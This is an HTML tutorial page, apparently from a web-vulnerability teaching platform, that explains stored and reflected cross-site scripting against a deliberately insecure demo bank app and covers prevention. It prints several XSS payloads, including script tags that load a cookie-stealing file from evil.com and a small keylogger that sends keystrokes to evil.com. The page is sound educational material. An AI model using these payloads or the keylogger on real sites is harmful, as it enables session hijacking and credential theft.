@@ -1,0 +1,396 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <link rel="stylesheet" href="../index.css">
+
+  <title>Web-Vulnerability Platform</title>
+</head>
+
+<body>
+
+  <!-- Menu bar  to copied over files -->
+  <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark MenuBar">
+    <a class=" navbar-brand" href="../index.html">Home</a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+      aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarCollapse">
+      <ul class="navbar-nav mr-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="../pages/sql_injection.html">SQL Injection</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link active" href="../pages/xss.html">Cross-Site Scripting <span
+              class="sr-only">(current)</span></a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="../pages/csrf.html">Cross-Site Request Forgery</a>
+        </li>
+          <li class="nav-item">
+          <a class="nav-link" href="../pages/insecure_direct_object_references.html">Insecure Direct Object References</a>
+        </li>
+      </ul>
+      <div id="reset-success" class="alert alert-success hidden" role="alert">Successful reset</div>
+      <div id="reset-failure" class="alert alert-danger hidden" role="alert">Failed to reset</div>
+      <button class="btn btn-primary" style="float: left" onclick="reset()">Reset</a>
+    </div>
+  </nav>
+
+  <main role="main" class="container">
+    <h1>Cross-Site Scripting (XSS)</h1>
+    <div class="jumbotron">
+      <hr>
+      <h3>What</h3>
+      <p>
+        Cross-Site Scripting (<i>XSS</i>) is a type of code injection attack, allowing arbitrary code execution
+        on otherwise trusted websites that are viewed by target users. To inject the malicious code the attacker has to find a <i>XSS</i> vulnerability in the target website.
+        The injected code is executed by the users' browser, which trusts the code since the <i>Same-Origin Policy</i> is not violated.
+        The malicious code can access everything that is accessible through client-side scripting, like tokens, cookies, or otherwise sensitive information.
+      </p>
+
+      <hr>
+      <h3>How</h3>
+      <p>
+        The key aspect of the attack is that the attacker obtains an <i>XSS</i> vulnerability in the target website. 
+        Through this vulnerability the malicious code can be injected. Furthermore, the injected code must also be automatically executed by the user's browser to become effective.
+        There exist multiple ways to inject malicious code through vulnerabilities. Two of the most prevalent attack types, <i>stored</i> and <i>reflective</i> are evaluated.
+      </p>
+      <h4>Malicious payloads</h4>
+      <p>
+          There exist many types of <i>XSS</i> payloads, which use a wide variety of HTML tags. Various types of payloads are shown below. 
+          In every payload <i>alert('XSS')</i> represents the arbitrary malicious code that is executed. The payloads listed below are quite basic. More advanced examples can be found <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">here</a>.
+          <pre class="prettyprint">
+// Simple script tag, often not directly evaluated by the browser as a protection against XSS
+<input class="request-input" type="text" value="<script>alert('XSS')</script>"/>
+
+// Simple script tag, loading an external Javascript file containing the malicious code
+<input class="request-input" type="text" value="<script src='http://evil.com/stealcookies.js'></script>"/>
+
+// Img tag with an empty src which triggers the onerror event pointing to the malicious code
+<input class="request-input" type="text" value="<img src='' onerror=alert('XSS')>"/>
+
+// Svg tag for which the onload event is triggered which executes the malicious code
+<input class="request-input" type="text" value="<svg onload=alert('XSS')>"/>
+
+// Div tag which executes the malicious code once the users enter the area of the div with the pointer
+<input class="request-input" type="text" value="<div onpointerenter=alert('XSS')>XSS</div>"/></pre>
+      </p>
+      <h4>Stored</h4>
+      <p>
+        A common occurring attack type is the <i>stored</i> attack. In the <i>stored</i> attack type the injected malicious code is stored in the back-end and thus persists over user sessions.
+        The injected malicious code is then retrieved in the future from the back-end and displayed to the user, which triggers the execution of the malicious code.
+        
+        In the simplest case, imagine a website where users can
+        leave comments. These comments are retrieved from a back-end and displayed to the user through HTML. 
+
+        If these comments contain malicious code, this code is then automatically executed. As the malicious 
+        code is now directly served by the website, and the browser is not able to distinguish normal from malicious calls. 
+        This allows malicious users to leave comments on this website which contain malicious code. If the website is then visited
+        by target users, the malicious code within these comments is then automatically executed.
+      </p>
+      <p>
+        Fortunately, almost all modern browsers try to intercept attempted XSS attacks. For example, suppose that
+        comments were normally rendered through javascript by editing the innerHTML of a new list element. An example of
+        this is shown in the following code block.
+      </p>
+
+      <pre class="prettyprint">
+// Comment retrieved from the back-end
+const comment     = '&ltscript src="https://evil.com/steal_cookies.js"&gt&lt/script&gt';
+
+// Get the comment list element 
+const commentList = document.getElementById('commentListId')
+
+// Add a new comment
+const li          = document.createElement("li")
+li.innerHTML      = comment
+commentList.appendChild(li)</pre>
+      <p>
+        Any <i>script</i> tag that is supplied through the innerHTML property will not be executed. This prevents the trivial case of
+        executing Javascript by leaving comments on the page which are rendered in this way. Although, this most basic type of payload does not get executed, 
+        all other payloads listed above (<i>img</i>, <i>svg</i>, etc.) do get executed.
+      </p>
+
+      <h4>Reflected</h4>
+      <p>
+        Another commonly occurring XSS attack type is the <i>reflected</i>. In the simplest case,
+        the attacker provides the user with an URL, where the URL itself contains malicious code. The uses clicks URL, which initiates the attack.
+        The reflected attack relies on the fact that a parameter in the URL is directly displayed to the user through HTML.
+      </p>
+      <p>
+        An example of a URL containing malicious code is shown below. Here, the value of the query parameter <i>q</i> contains the malicious code.
+        For the code to be executed, the value of the query parameter <i>q</i> needs to be displayed directly to the user.
+        <pre class="prettyprint">
+<input class="request-input" type="text" value='http://insecurebanking.com?q=&lt;script&gt;alert("XSS")&lt;/script&gt;'/></pre>
+        <p>
+          From the URL, we can see that a script is executed which generates an alert. This script can
+          then be replaced by an attacker to execute any arbitrary script. In the example below a script called <i>stealcookies.js</i> script is retrieved from <i>http://evil.com</i>. 
+          The <i>stealcookies.js</i> is then evaluated by the user's browser and attempts to steal cookies.
+        </p>
+        <pre class="prettyprint">
+<input class="request-input" type="text" value='http://insecurebanking.com?q=&lt;script src=”http://evil.com/stealcookies.js”&gt;&lt;/script&gt;'/></pre>
+        
+      </p>
+
+      <hr>
+      <h3>Consequences</h3>
+      <p>
+        The consequences of <i>XSS</i> can be quite disastrous. If an application contains an <i>XSS</i> vulnerability, it is possible to execute any arbiratry code.
+        The attacker can access session tokens, cookies, or otherwise sensitive information. Furthermore,
+        the script can rewrite the HTML page. This facilitates a host of attack vectors, such as mimicking
+        actual web application behavior, but with malicious results. 
+      </p>
+      <p>
+        A list of pre-made <i>XSS</i> payloads can be found <a href="http://www.xss-payloads.com/payloads-list.html?a#category=all">here</a>. A very simple, but effective example, is listed below. 
+        The example shows a very basic keylogger, which sends all keystrokes to a domain under the control of the attacker. Such a key logger could be used to steal usernames and passwords.
+      </p>
+      <pre class="prettyprint">
+// Global variable for storing all keys
+let keys='';
+
+// Register callback which gets triggered for every key press
+document.onkeypress = function(e) 
+{
+  get   = window.event? event : e;
+  key   = get.keyCode ? get.keyCode : get.charCode;
+  key   = String.fromCharCode(key);
+  keys += key;
+}
+
+// Every second sends stored key presses to domain under the attackers' control
+window.setInterval(function()
+{
+  new Image().src = 'http://evil.com/keylogger?keys='+keys;
+  keys = '';
+}, 1000);</pre>
+
+      <hr>
+      <h3>Prevention</h3>
+      <p>
+        There are various ways to prevent <i>XSS</i> attacks. Attacks can be prevented by the user and by the application itself. A very elaborated discussion on the prevention of <i>XSS</i> attacks can be found <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">here</a>. 
+      
+        <h4>User</h4>
+        <p>
+            First of all, the user can prevent <i>reflective</i> XSS attacks by inspecting the links that they are clicking on.
+            Users should not click on links that contain malicious payloads.
+        </p>
+
+        <h4> Escaping User Input</h4>
+        <p>
+          In general, rendering user data directly can lead to many complications or different attack vectors. Thus, escaping all HTML or Javascript tags from user input is a necessary step. Furthermore, if possible, constrain the user's input ability altogether through the use of a form.
+        </p>
+        <h4> No Direct Parameter Embedding </h4>
+        <p>
+          General safety measures need to be taken in  order to prevent any direct embedding of anything that the user can modify or manipulate in general. This prevents a whole host of attack vectors. Furthermore, this also drives towards safe and secure software development practices, instead of relying on easy, unsafe solutions (such as directly embedding query parameters).
+        </p>
+        <h4> Validating Input</h4>
+        <p>
+          General input validation can prevent other processing elements of the input pipeline to continue
+          safely without the need for continuous checking. However, the input validation needs to be up to date with all latest exploits. This can be an arduous task. 
+        </p>
+        <h4> Sanitizing User Input</h4>
+        <p>
+          Scrubbing the data clean of all HTML or Javascript tags can help prevent these types of attacks. Not all XSS attacks can be prevented by just sanitizing user input. If query parameters are used inappropriately, without using the user input
+          as attack vector, the attacker is still able to construct an XSS attack by exploiting the query parameter embedding.
+        </p>
+      </p>
+      <hr>
+      <h3>Examples</h3>
+      <p>
+        You are a customer of <a href="insecurebanking.com">insecurebanking.com</a>. This bank has money transfer facilities. As a user,
+        you can request an overview of all transfers. Insecurebanking allows users to attach messages to
+        these transfers.
+      </p>
+
+      <h4>Reflected</h4>
+      <p>
+        Suppose you want to be able to view all the transactions you made as a user to a specific person. 
+        An application could store the ID of the target person in a query parameter.
+        The query parameter would be used in a request made to the back-end to retrieve the transactions matching the specified target user ID.
+        Furthermore, to provide feedback to the user, the choice of target user ID (which is the query parameter) is shown to the user on the web page.
+        
+        <!-- <form>
+          <div class="form-group">
+            <label for="reflectiveToId">To ID</label>
+            <input type="number" class="form-control" id="reflectiveToId" placeholder="Enter ID">
+          </div>
+        </form>
+
+        <btn class="btn btn-primary inline-btn" onclick="getTransactionsFromTo()">
+          Retrieve transactions
+        </btn> -->
+      </p>
+
+      <p>
+        This functionality can be demonstrated by clicking on the following link: <a id="reflectiveToLink" href="">localhost:8080/xss.html?to=2</a>.
+      </p>
+      <p>In the next snippet the value of the query parameter is shown. Furthermore, it can be seen that the transactions to a certain user are retrieved
+          based on the query parameter, since the "To" column displays the same value as the query parameter.</p>
+      <pre class="prettyprint nocode">// Query parameter value<div id="reflectedToId"></div></pre>
+        <br>
+      <table class="table table-striped">
+        <thead>
+          <tr>
+            <th scope="col">Transaction ID</th>
+            <th scope="col">From</th>
+            <th scope="col">To</th>
+            <th scope="col">Amount</th>
+            <th scope="col">Reference</th>
+          </tr>
+        </thead>
+        <tbody id='toFromId'>
+        </tbody>
+      </table>
+
+      <p>
+          This type of query parameter display can be abused to perform a <i>reflected</i> XSS attack. The attack vector here
+          is the direct display of the query parameter through HTML. However, a malicious payload still needs to be crafted. The simplest malicious payload
+          would be a simple Javascript script as listed below.
+          <pre class="prettyprint"><input class="request-input" type="text" value="&lt;script&gt;alert('XSS')&lt;/script&gt;"/></pre>
+      </p>
+      <p>
+        However, as mentioned before such payloads are not evaluated by modern browsers if put in innerHTML. However, there are many other possible payloads which can be crafted
+        and which still allow for malicious payload execution. An example of such a payload is listed below.
+        <pre class="prettyprint"><input class="request-input" type="text" value="&lt;img src='' onerror='(function() { alert('XSS') }).call(this)&gt;"></pre>
+      </p>
+      <p>
+        In the above malicious payload the <i>img</i> tag is abused. The tag must be provided with a <i>src</i> attribute to load the image from. 
+        However, it also provides an event for handling errors in the loading of the image, called <i>onerror</i>. It allows users to specificy a Javascript, which will be
+        executed whenever the image from the specified <i>src</i> fails to load and produces an error. By setting the <i>src</i> attribute to an empty string, an error event can be triggered, which leads to the execution
+        of the function specified in the <i>onerror</i> attribute. The specified function can be arbitrary Javascript code. In this case, an anonymous function is defined which will be executed and alert the user.
+        The malicious payload will become the value of the query parameter. By copying the link below and opening it, the <i>reflected</i> XSS attack will be executed and an alert will pop up.
+        <pre class="prettyprint"><input id="reflectiveToLinkInjection" class="request-input" type="text" value=""></pre>
+      </p>
+
+      <h4>Stored</h4>
+      <p>
+        Down below we can retrieve all the transactions that have been made by a certain user by clicking on the button.
+        A request is made to the back-end, which will retrieve all relevant transactions. Each transaction also contains a reference field.
+        This reference field can contain arbitrary comments, like "Thanks Mark!" and "Thanks Edser!".
+        <btn class="btn btn-primary inline-btn" onclick="getTransactionList('rowsId')">
+          Retrieve transactions
+        </btn>
+        <table class="table table-striped">
+            <thead>
+              <tr>
+                <th scope="col">Transaction ID</th>
+                <th scope="col">From</th>
+                <th scope="col">To</th>
+                <th scope="col">Amount</th>
+                <th scope="col">Reference</th>
+              </tr>
+            </thead>
+            <tbody id='rowsId'>
+            </tbody>
+          </table>
+      </p>
+      
+
+      <p>
+        In a banking application it is of course possible to make transactions. Down below a set of fields can be found by which the transaction is specified.
+        In this case the reference field allows arbitrary values to be set. These values are stored in the database connected to the back-end. 
+        Since the transactions are displayed to the user, this could be an interesting attack vector for a <i>stored</i> XSS attack. 
+        Again, a malicious payload needs to be crafted. The same logic applies as with the <i>reflected</i> XSS attack. A simple <i>script</i> tag based payload would again not be evaluated by the innerHTML.
+        Therefore, the same <i>img</i> tag malicious payload as with the <i>reflective</i> attack is used.
+      </p>
+      <p>
+        The attacker could create a transaction to the target user, with the malicious payload as a reference. 
+        Suppose the attacker has user ID 5 and the target user has ID 1. The attacker decides to transfer a token amount to target user. Fill out the fields below with the suggested values.
+        In the reference field enter the malicious payload and press the <i>Make transaction</i> button to make a transaction.
+      </p>
+      <pre class="prettyprint nocode">
+// Malicious payload
+<input id="reflectiveToLinkInjection" class="request-input" type="text" value='Thanks!&lt;img src="" onerror="(function() { alert(`XSS`) }).call(this)"&gt;'></pre>
+      
+        <form class="inline-form">
+          <div class="form-group">
+            <label for="toId">From ID</label>
+            <input type="number" class="form-control" id="fromId" placeholder="Enter User ID">
+          </div>
+          <div class="form-group">
+            <label for="toId">To ID</label>
+            <input type="number" class="form-control" id="toId" placeholder="Enter User ID">
+          </div>
+          <div class="form-group">
+            <label for="amountId">Amount</label>
+            <input type="number" class="form-control" id="amountId" placeholder="Enter amount">
+          </div>
+          <div class="form-group">
+            <label for="referenceId">Reference</label>
+            <input type="text" class="form-control" id="referenceId" placeholder="Enter reference">
+          </div>
+        </form>
+        <p>
+        <button class="btn btn-primary inline-btn" onclick="makeTransaction()">Make transaction</button>
+        <div id="transaction-success" class="alert alert-success hidden inline-alert" role="alert">Transaction succeeded</div>
+        <div id="transaction-failure" class="alert alert-danger hidden inline-alert" role="alert">Transaction failed</div>
+      </p>
+      
+      <p>
+          The transaction has now been sent to the back-end, which stored the transaction in the database.
+          Now if the target user retrieves the transactions associated to their account again, the transaction containing the malicious payload will also be retrieved.
+          You can try this by retrieving the transactions with the button below, which will trigger the <i>stored</i> XSS attack.
+          <btn class="btn btn-primary inline-btn" onclick="getTransactionList('rowsStoredId')">
+              Retrieve transactions
+          </btn>
+      </p>
+
+      
+      </p>
+      <table class="table table-striped">
+        <thead>
+          <tr>
+            <th scope="col">Transaction ID</th>
+            <th scope="col">From</th>
+            <th scope="col">To</th>
+            <th scope="col">Amount</th>
+            <th scope="col">Reference</th>
+          </tr>
+        </thead>
+        <tbody id='rowsStoredId'>
+        </tbody>
+      </table>
+      <hr><h3>References</h3>
+      <p>
+        Below you can find some interesting links to other websites that also explain various 
+        aspects of XSS attacks:
+      </p>
+      <ul class="references">
+        <li class="reference">
+          <a target="_blank" href="http://www.xss-payloads.com/payloads-list.html?a#category=all">Examples of ready-made XSS payloads</a>
+        </li>
+        <li class="reference">
+            <a target="_blank" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS prevention</a>
+          </li>
+        <li class="reference">
+          <a target="_blank" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">Examples of injection vectors</a>
+        </li>
+      </ul>
+    </div>
+  </main>
+
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+  integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+  crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+  integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+  crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>    
+  <script src="../reset.js"></script>
+  <script src="xss.js"></script>
+  <script src="xss_init.js"></script>
+</body>
+
+</html>
